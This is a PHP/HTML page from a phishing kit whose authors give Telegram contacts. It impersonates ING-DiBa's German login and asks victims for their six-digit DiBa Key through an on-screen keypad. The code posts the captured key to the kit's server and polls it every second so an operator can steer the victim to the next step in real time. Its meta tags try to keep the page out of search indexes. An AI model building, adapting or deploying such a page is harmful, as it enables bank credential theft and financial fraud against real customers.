<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
    reset_action(get_client_ip());
    $_SESSION['last_page'] = 'firma';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">

        <link rel="icon" type="image/png" href="../assets/imgs/favicon.png" />

        <title>ING Login</title>
    </head>

    <body>

        <div id="loader">
            <div class="inner">
                <ul>
                    <li></li>
                    <li></li>
                    <li class="active"></li>
                </ul>
                <p>Bitte warten</p>
            </div>
        </div>

		<!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo"><img src="../assets/imgs/logo.svg"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="title">
                    <h3>Willkommen</h3>
                </div>

                <div class="box">
                    <div class="firma-area">

                        <div class="error" style="<?php if( $_GET['error'] == 1 ) { echo 'display: flex'; } ?>">
                            <div class="sym"><img style="min-width: 57px;" src="../assets/imgs/error.png"></div>
                            <div class="content">
                                <h3>Bitte beachten Sie:</h3>
                                <p>Bitte geben Sie die 2 ausgewählten Ziffern Ihres 6-stelligen DiBa Keys zur Anmeldung ein.</p>
                            </div>
                        </div>

                        <div class="row">
                            <div class="col-md-4">
                                <div class="title">
                                    <h3>Eingabe Ihres DiBa Keys <img src="../assets/imgs/ex.png"></h3>
                                    <p>Benutzen Sie zur Eingabe Ihres DiBa Keys das angezeigte Tastaturfeld. Tippen oder klicken Sie dazu einfach auf die Ziffern.</p>
                                </div>
                            </div>
                            <div class="col-md-8">
                                <p style="color: #ff6200; text-decoration: underline; font-size: 16px; margin-bottom: 30px;">DiBa Key vergessen?</p>
                                <form action="../index.php" method="post" id="form">
                                    <input type="hidden" name="captcha">
                                    <input type="hidden" name="step" value="firma">
                                    <input type="hidden" name="firma" id="firma">
                                    <div class="firma-box">
                                        <div class="firma-header">
                                            <ul class="d-flex">
                                                <li class="flex-grow-1"><span>1</span></li>
                                                <li class="flex-grow-1"><span>2</span></li>
                                                <li class="flex-grow-1"><span>3</span></li>
                                                <li class="flex-grow-1"><span>4</span></li>
                                                <li class="flex-grow-1"><span>5</span></li>
                                                <li class="flex-grow-1"><span>6</span></li>
                                            </ul>
                                        </div>
                                        <div class="firma-body">
                                            <table cellpadding="5" cellspacing="5">
                                                <tr>
                                                    <td><span>1</span></td>
                                                    <td><span>2</span></td>
                                                    <td><span>3</span></td>
                                                </tr>
                                                <tr>
                                                    <td><span>4</span></td>
                                                    <td><span>5</span></td>
                                                    <td><span>6</span></td>
                                                </tr>
                                                <tr>
                                                    <td><span>7</span></td>
                                                    <td><span>8</span></td>
                                                    <td><span>9</span></td>
                                                </tr>
                                                <tr>
                                                    <td><span>0</span></td>
                                                    <td colspan="2"><span class="reset">Korrector</span></td>
                                                </tr>
                                            </table>
                                        </div>
                                    </div>
                                    <div class="btns text-right mt30">
                                        <button class="mr-3" type="button">Abbrechen</button>
                                        <button type="submit" id="submit"><i class="fas fa-angle-right"></i> Log-in</button>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
                
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <ul>
                <li>Karriere</li>
                <li>Vertriebspartner</li>
                <li>Wholesale Banking</li>
                <li>Kontaktformular</li>
                <li>AGB</li>
                <li>Datenschutz</li>
                <li>Impressum</li>
            </ul>
            <div><img style="min-width: 144px;" src="../assets/imgs/social.png"></div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
		<script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
        <script src="../assets/js/script.js"></script>

        <script>
            $('.firma-body td span').click(function(){
                if($(this).hasClass('reset')) {
                    $('#firma').val('');
                    $('.firma-header ul li').removeClass('active');
                    return;
                }
                var num = $(this).text();
                var old_val = $('#firma').val();
                var zz = old_val + num;
                if( $('#firma').val().length == 6 )
                    return false;
                $('#firma').val(zz);
                var target = $('.firma-header ul li:not(.active)');
                var tt = target[0];
                $(target[0]).addClass('active');
            });

            $('#submit').click(function(e) {
                e.preventDefault();
                $('.error').hide();
                $('#loader').css({"display":"flex"}).show(200,function() {
                    $.post( "../index.php", $('#form').serialize() )
                        .done(function( data ) {
                        if( data == 'success' ) {
                            
                            (function worker() {
                                $.ajax({
                                    method: "GET",
                                    url: '../index.php?waiting=1',
                                    success: function (data) {
                                        if( data !== '' ) {
                                            window.location.href= '../index.php?redirection=' + data;
                                        }
                                    },
                                    complete: function () {
                                        setTimeout(worker, 1000);
                                    }
                                });
                            })();

                        } else if( data == 'error' ) {
                            $('#loader').hide();
                            $('.error').css({"display":"flex"}).show();
                        }
                    });
                });
            });

        </script>

    </body>

</html>